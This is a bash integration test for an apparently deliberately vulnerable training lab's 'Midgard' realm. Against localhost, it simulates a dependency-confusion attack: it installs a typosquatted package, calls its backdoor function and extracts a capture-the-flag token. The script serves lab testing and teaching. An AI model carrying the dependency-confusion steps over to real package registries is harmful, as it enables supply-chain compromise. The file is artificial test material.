#!/bin/bash
# Integration test for Midgard - Dependency Confusion

set -e

REALM="midgard"
BASE_URL="http://localhost:8080/realms/${REALM}"

echo "========================================"
echo "Testing MIDGARD Realm"
echo "A03:2025 - Supply Chain Failures"
echo "========================================"
echo ""

echo "Step 1: Health check..."
curl -s "${BASE_URL}/health" | grep -q '"status":"ok"' && echo "✓ Health OK" || exit 1

echo "Step 2: List available packages..."
PACKAGES=$(curl -s "${BASE_URL}/api/packages")
echo "$PACKAGES" | grep -q '"success":true' && echo "✓ Packages listed" || exit 1
echo "$PACKAGES" | grep -q 'midgard-ui-kit' && echo "  Found malicious package" || exit 1

echo "Step 3: Install malicious package (dependency confusion)..."
INSTALL_RESULT=$(curl -s -X POST "${BASE_URL}/api/install" \
  -H "Content-Type: application/json" \
  -d '{"packageName": "midgard-ui-kit"}')

echo "$INSTALL_RESULT" | grep -q '"success":true' && echo "✓ Package installed" || exit 1
echo "$INSTALL_RESULT" | grep -q '"registry":"public"' && echo "  ⚠️ Package from PUBLIC registry (VULNERABLE)" || exit 1

echo "Step 4: Execute malicious function..."
EXEC_RESULT=$(curl -s -X POST "${BASE_URL}/api/execute" \
  -H "Content-Type: application/json" \
  -d '{"packageName": "midgard-ui-kit", "functionName": "getSecretConfig"}')

echo "$EXEC_RESULT" | grep -q '"backdoor":true' && echo "✓ Malicious code executed" || exit 1

FLAG=$(echo "$EXEC_RESULT" | grep -oP 'YGGDRASIL\{MIDGARD:[a-f0-9-]+\}')

if [ -z "$FLAG" ]; then
  echo "✗ Flag not found"
  exit 1
fi

echo "✓ Flag extracted: $FLAG"

echo "Step 5: Validate flag format..."
echo "$FLAG" | grep -qP '^YGGDRASIL\{MIDGARD:[a-f0-9-]+\}$' && echo "✓ Flag format valid" || exit 1

echo ""
echo "========================================"
echo "✓ All MIDGARD tests passed!"
echo "========================================"
echo "Flag: $FLAG"
echo ""
echo "Exploit Summary:"
echo "  1. Listed packages from both registries"
echo "  2. Identified typosquat: 'midgard-ui-kit' vs '@midgard/ui-kit'"
echo "  3. Installed malicious public package (dependency confusion)"
echo "  4. Executed backdoor function 'getSecretConfig'"
echo "  5. Retrieved realm flag from malicious code"
